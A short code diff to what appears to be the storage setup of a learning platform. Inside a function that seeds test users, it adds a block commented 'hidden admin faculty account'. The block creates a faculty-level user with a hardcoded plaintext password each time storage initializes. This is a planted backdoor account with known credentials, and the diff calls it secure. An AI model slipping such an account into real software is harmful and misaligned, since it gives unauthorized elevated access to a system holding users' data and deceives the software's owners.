@@ -341,6 +341,18 @@ async function ensureTestUser() {
       userType: "student"
     });
   }
+
+  // Add hidden admin faculty account
+  const adminFaculty = await storage.getUserByUsername("faculty.admin");
+  if (!adminFaculty) {
+    await storage.createUser({
+      username: "faculty.admin",
+      password: await hashPassword("AdminFaculty@2024"), // Secure password
+      email: "admin.faculty@learning.com",
+      fullName: "Faculty Admin",
+      userType: "faculty"
+    });
+  }
 }
 
 // Call this when initializing storage
